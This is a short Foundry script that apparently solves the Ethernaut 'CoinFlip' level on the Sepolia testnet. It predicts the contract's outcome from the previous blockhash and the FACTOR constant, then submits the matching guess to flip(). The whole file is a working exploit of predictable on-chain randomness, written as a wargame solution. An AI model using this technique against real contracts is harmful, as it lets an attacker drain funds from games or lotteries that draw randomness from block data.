// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {CoinFlip} from "../src/CoinFlip.sol";

contract CoinFlipScript is Script {
    function setUp() public {
        vm.createSelectFork("https://ethereum-sepolia-rpc.publicnode.com"); 
    }

    function run() public {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        CoinFlip coinFlipContract = CoinFlip(0xa0414398654Fcc3028F13301C8a175712cB9A186);

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        vm.broadcast();
        bool result = coinFlipContract.flip(side);
        
        console.log(result);
        console.log(coinFlipContract.consecutiveWins());
    }
}
